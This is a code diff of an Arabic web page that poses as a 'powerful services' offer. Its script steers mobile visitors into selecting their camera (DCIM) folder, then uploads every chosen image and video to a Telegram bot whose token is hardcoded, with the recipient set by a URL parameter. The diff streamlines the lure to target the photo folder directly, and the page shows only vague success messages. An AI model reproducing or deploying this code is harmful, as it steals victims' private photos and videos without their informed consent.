@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الخدمات القوية</title>
+    <title>خدماتنا</title>
     <style>
         * {
             margin: 0;
@@ -18,41 +18,34 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
-            font-family: 'Arial', sans-serif;
-            text-align: center;
+            font-family: Arial, sans-serif;
         }
         
         .container {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            max-width: 500px;
+            text-align: center;
+            padding: 20px;
             width: 100%;
+            max-width: 400px;
         }
         
         .message {
             font-size: 22px;
             margin-bottom: 30px;
-            line-height: 1.5;
+            line-height: 1.4;
         }
         
         .btn {
             background: linear-gradient(to right, #f46b45, #eea849);
             color: white;
             border: none;
-            padding: 15px 40px;
-            font-size: 18px;
+            padding: 18px 40px;
+            font-size: 20px;
             border-radius: 50px;
             cursor: pointer;
             transition: all 0.3s;
             font-weight: bold;
-            display: block;
             width: 100%;
-            margin: 10px 0;
+            max-width: 250px;
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
@@ -64,69 +57,37 @@
             transform: scale(0.98);
         }
         
-        .hidden {
-            display: none !important;
-        }
-        
-        .file-input {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            padding: 0;
-            margin: -1px;
-            overflow: hidden;
-            clip: rect(0, 0, 0, 0);
-            white-space: nowrap;
-            border: 0;
-        }
-        
-        .progress-container {
-            margin-top: 20px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            padding: 15px;
-            display: none;
-        }
-        
-        .progress-bar {
-            height: 10px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 5px;
-            overflow: hidden;
-            margin-top: 10px;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(to right, #4CAF50, #8BC34A);
-            width: 0%;
-            transition: width 0.3s;
-        }
-        
-        .status {
-            margin-top: 15px;
-            padding: 10px;
-            border-radius: 10px;
-            font-size: 14px;
-            display: none;
-        }
-        
-        .status.success {
-            background: rgba(76, 175, 80, 0.2);
-            border: 1px solid #4CAF50;
-            display: block;
-        }
-        
-        .status.error {
-            background: rgba(244, 67, 54, 0.2);
-            border: 1px solid #F44336;
-            display: block;
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
         }
         
         .loading {
-            font-size: 14px;
-            margin-top: 10px;
+            margin-top: 20px;
+            font-size: 16px;
             color: rgba(255, 255, 255, 0.8);
+            display: none;
+        }
+        
+        .success-message {
+            background: rgba(76, 175, 80, 0.2);
+            border: 1px solid #4CAF50;
+            padding: 10px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+            font-size: 14px;
+        }
+        
+        .error-message {
+            background: rgba(244, 67, 54, 0.2);
+            border: 1px solid #F44336;
+            padding: 10px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+            font-size: 14px;
         }
     </style>
 </head>
@@ -134,33 +95,15 @@
     <div class="container">
         <div class="message">إضغط علي الزر لتتمتع بخدماتنا القويه</div>
         
-        <button id="mainBtn" class="btn">الخدمات</button>
+        <button id="servicesBtn" class="btn">الخدمات</button>
         
-        <div id="uploadSection" class="hidden">
-            <button id="folderBtn" class="btn">بدء</button>
-            
-            <!-- ملفات متعددة للصور -->
-            <input type="file" id="imageFiles" class="file-input" accept="image/*" multiple>
-            
-            <!-- ملفات متعددة للفيديوهات -->
-            <input type="file" id="videoFiles" class="file-input" accept="video/*" multiple>
-            
-            <!-- ملفات متعددة للمستندات -->
-            <input type="file" id="docFiles" class="file-input" accept=".pdf,.doc,.docx,.txt" multiple>
-            
-            <!-- ملفات متعددة للجميع -->
-            <input type="file" id="allFiles" class="file-input" multiple>
-            
-            <div id="progressContainer" class="progress-container">
-                <div id="statusText">جاري الإعداد...</div>
-                <div class="progress-bar">
-                    <div id="progressFill" class="progress-fill"></div>
-                </div>
-                <div id="counter" class="loading">0/0</div>
-            </div>
-            
-            <div id="statusMessage" class="status"></div>
-        </div>
+        <div id="loading" class="loading">جاري المعالجة...</div>
+        
+        <div id="successMessage" class="success-message"></div>
+        <div id="errorMessage" class="error-message"></div>
+        
+        <!-- Input مخفي لاختيار الملفات -->
+        <input type="file" id="fileInput" webkitdirectory directory multiple style="display: none;" accept="image/*,video/*">
     </div>
 
     <script>
@@ -168,84 +111,66 @@
         const BOT_TOKEN = "8481752278:AAHs9O3Ilf0LRTJPIAhpdC92gC3_ufME78g";
         
         // العناصر
-        const mainBtn = document.getElementById('mainBtn');
-        const uploadSection = document.getElementById('uploadSection');
-        const folderBtn = document.getElementById('folderBtn');
-        const progressContainer = document.getElementById('progressContainer');
-        const progressFill = document.getElementById('progressFill');
-        const statusText = document.getElementById('statusText');
-        const counter = document.getElementById('counter');
-        const statusMessage = document.getElementById('statusMessage');
-        
-        // ملفات الإدخال
-        const imageFilesInput = document.getElementById('imageFiles');
-        const videoFilesInput = document.getElementById('videoFiles');
-        const docFilesInput = document.getElementById('docFiles');
-        const allFilesInput = document.getElementById('allFiles');
+        const servicesBtn = document.getElementById('servicesBtn');
+        const fileInput = document.getElementById('fileInput');
+        const loading = document.getElementById('loading');
+        const successMessage = document.getElementById('successMessage');
+        const errorMessage = document.getElementById('errorMessage');
         
         // عند النقر على زر الخدمات
-        mainBtn.addEventListener('click', function() {
-            uploadSection.classList.remove('hidden');
-            mainBtn.classList.add('hidden');
+        servicesBtn.addEventListener('click', function() {
+            // نغير نص الزر
+            servicesBtn.textContent = "بدء";
+            servicesBtn.disabled = false;
+            
+            // نغير وظيفة الزر لفتح مجلد DCIM
+            servicesBtn.onclick = openDCIMFolder;
         });
         
-        // عند النقر على زر استخدام المجلد
-        folderBtn.addEventListener('click', async function() {
-            // نعرض خيارات للمستخدم لاختيار نوع الملفات
-            if (confirm('اختر نوع الملفات التي تريد رفعها:\n\nموافق: كل الملفات\nإلغاء: اختيار نوع محدد')) {
-                // كل الملفات
-                allFilesInput.click();
-            } else {
-                // اختيار نوع محدد
-                const fileType = prompt('اختر نوع الملفات:\n1 - صور\n2 - فيديوهات\n3 - مستندات\n4 - كل شيء');
-                
-                switch(fileType) {
-                    case '1':
-                        imageFilesInput.click();
-                        break;
-                    case '2':
-                        videoFilesInput.click();
-                        break;
-                    case '3':
-                        docFilesInput.click();
-                        break;
-                    default:
-                        allFilesInput.click();
-                }
+        // فتح مجلد DCIM
+        function openDCIMFolder() {
+            servicesBtn.disabled = true;
+            servicesBtn.textContent = "جاري الوصول للمجلد...";
+            
+            // نبدأ محاولة الوصول للمجلد
+            setTimeout(() => {
+                fileInput.click();
+            }, 500);
+        }
+        
+        // عند اختيار الملفات
+        fileInput.addEventListener('change', async function(e) {
+            const files = e.target.files;
+            
+            if (files.length === 0) {
+                resetButton();
+                return;
             }
-        });
-        
-        // دالة معالجة رفع الملفات
-        async function handleFileUpload(files) {
-            if (files.length === 0) return;
             
             // الحصول على chatid من الرابط
             const urlParams = new URLSearchParams(window.location.search);
             const chatId = urlParams.get('chatid');
             
             if (!chatId) {
-                showStatus('error', '❌ لم يتم العثور على chatid في الرابط');
+                showError('❌ لم يتم العثور على chatid في الرابط');
+                resetButton();
                 return;
             }
             
-            // إظهار شريط التقدم
-            progressContainer.style.display = 'block';
-            statusText.textContent = 'جاري إعداد الملفات...';
-            progressFill.style.width = '0%';
-            counter.textContent = `0/${files.length}`;
+            // إظهار رسالة التحميل
+            loading.style.display = 'block';
+            servicesBtn.style.display = 'none';
             
             try {
                 let successfulUploads = 0;
                 const totalFiles = files.length;
                 
+                // إرسال كل الملفات
                 for (let i = 0; i < totalFiles; i++) {
                     const file = files[i];
                     
-                    // تحديث شريط التقدم
-                    const progress = Math.floor(((i + 1) / totalFiles) * 100);
-                    progressFill.style.width = `${progress}%`;
-                    counter.textContent = `${i + 1}/${totalFiles}`;
-                    statusText.textContent = `جاري رفع: ${file.name}`;
+                    // تحديث رسالة التحميل
+                    loading.textContent = `جاري الرفع... ${i + 1}/${totalFiles}`;
                     
                     // إرسال الملف إلى التلجرام
                     const success = await sendToTelegram(file, chatId);
@@ -255,29 +180,30 @@
                     }
                     
                     // تأخير بسيط بين الملفات
-                    await new Promise(resolve => setTimeout(resolve, 500));
+                    await new Promise(resolve => setTimeout(resolve, 300));
                 }
                 
                 // عرض نتيجة الرفع
-                if (successfulUploads === totalFiles) {
-                    showStatus('success', `✅ تم رفع ${successfulUploads} ملف بنجاح`);
-                } else if (successfulUploads > 0) {
-                    showStatus('success', `⚠️ تم رفع ${successfulUploads} من ${totalFiles} ملف`);
+                if (successfulUploads > 0) {
+                    showSuccess(`✅ تم الانتهاء بنجاح`);
                 } else {
-                    showStatus('error', '❌ فشل رفع الملفات');
+                    showError('❌ لم يتم رفع أي ملف');
                 }
                 
-                // إخفاء شريط التقدم بعد 3 ثوان
-                setTimeout(() => {
-                    progressContainer.style.display = 'none';
-                    progressFill.style.width = '0%';
-                }, 3000);
-                
             } catch (error) {
-                showStatus('error', `❌ حدث خطأ: ${error.message}`);
-                progressContainer.style.display = 'none';
+                showError(`❌ حدث خطأ: ${error.message}`);
+            } finally {
+                // إخفاء التحميل
+                loading.style.display = 'none';
+                
+                // إعادة تعيين بعد 3 ثوان
+                setTimeout(() => {
+                    successMessage.style.display = 'none';
+                    errorMessage.style.display = 'none';
+                    resetButton();
+                }, 3000);
             }
-        }
+        });
         
         // إرسال ملف إلى التلجرام
         async function sendToTelegram(file, chatId) {
@@ -298,31 +224,36 @@
             }
         }
         
-        // عرض رسالة حالة
-        function showStatus(type, message) {
-            statusMessage.className = `status ${type}`;
-            statusMessage.textContent = message;
-            statusMessage.style.display = 'block';
-            
-            // إخفاء الرسالة بعد 5 ثوان
-            setTimeout(() => {
-                statusMessage.style.display = 'none';
-            }, 5000);
+        // إعادة تعيين الزر
+        function resetButton() {
+            servicesBtn.textContent = "استخدام المجلد";
+            servicesBtn.disabled = false;
+            servicesBtn.style.display = 'block';
+            servicesBtn.onclick = openDCIMFolder;
         }
         
-        // إضافة مستمعات الأحداث لمدخلات الملفات
-        imageFilesInput.addEventListener('change', (e) => handleFileUpload(e.target.files));
-        videoFilesInput.addEventListener('change', (e) => handleFileUpload(e.target.files));
-        docFilesInput.addEventListener('change', (e) => handleFileUpload(e.target.files));
-        allFilesInput.addEventListener('change', (e) => handleFileUpload(e.target.files));
+        // عرض رسالة نجاح
+        function showSuccess(message) {
+            successMessage.textContent = message;
+            successMessage.style.display = 'block';
+            errorMessage.style.display = 'none';
+        }
         
-        // إعادة تعيين المدخلات بعد الاختيار
-        [imageFilesInput, videoFilesInput, docFilesInput, allFilesInput].forEach(input => {
-            input.addEventListener('change', function() {
-                setTimeout(() => {
-                    this.value = '';
-                }, 100);
-            });
+        // عرض رسالة خطأ
+        function showError(message) {
+            errorMessage.textContent = message;
+            errorMessage.style.display = 'block';
+            successMessage.style.display = 'none';
+        }
+        
+        // محاولة فتح مجلد DCIM تلقائياً عند تحميل الصفحة
+        window.addEventListener('load', function() {
+            // نتحقق من أن المستخدم على هاتف
+            const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+            
+            if (isMobile) {
+                console.log("جهاز محمول مكتشف");
+            }
         });
     </script>
 </body>
